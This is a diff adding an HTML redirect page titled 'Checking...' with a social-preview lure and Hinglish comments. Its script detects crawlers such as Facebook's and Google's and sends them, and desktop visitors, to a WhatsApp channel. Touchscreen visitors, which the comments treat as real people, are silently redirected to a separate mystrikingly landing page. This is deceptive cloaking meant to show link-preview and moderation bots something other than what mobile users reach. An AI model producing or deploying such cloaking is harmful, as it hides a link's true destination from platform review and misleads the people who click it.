@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking...</title>
+
+    <!-- Social Preview (Bot ko dikhane ke liye) -->
+    <meta property="og:title" content="Click here to watch the project">
+    <meta property="og:image" content="https://i.postimg.cc/pVnf0wj0/73669265-2dfb-4111-acf8-415efe638507.jpg">
+    <meta property="og:type" content="website">
+
+    <script>
+        (function() {
+            var whatsappChannel = "https://whatsapp.com/channel/0029Vb8pdaR6buMT4C6gtW1O";
+            var mobileLandingPage = "https://ocher-bison-11v65rt.mystrikingly.com"; 
+
+            // 1. Touchscreen Detection
+            var isTouchCapable = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+
+            // 2. Bot Detection
+            var isBot = /facebookexternalhit|Facebot|Googlebot|Bot|Crawler|Spider/i.test(navigator.userAgent);
+
+            // LOGIC:
+            // Agar bot hai, seedha WhatsApp bhejo (2s delay ke saath)
+            if (isBot) {
+                setTimeout(function() { window.location.replace(whatsappChannel); }, 2000);
+            } 
+            // Agar Touchscreen hai (asli insaan), toh Landing Page
+            else if (isTouchCapable) {
+                window.location.replace(mobileLandingPage);
+            } 
+            // Agar Laptop/Desktop (No Touch), toh WhatsApp
+            else {
+                window.location.replace(whatsappChannel);
+            }
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
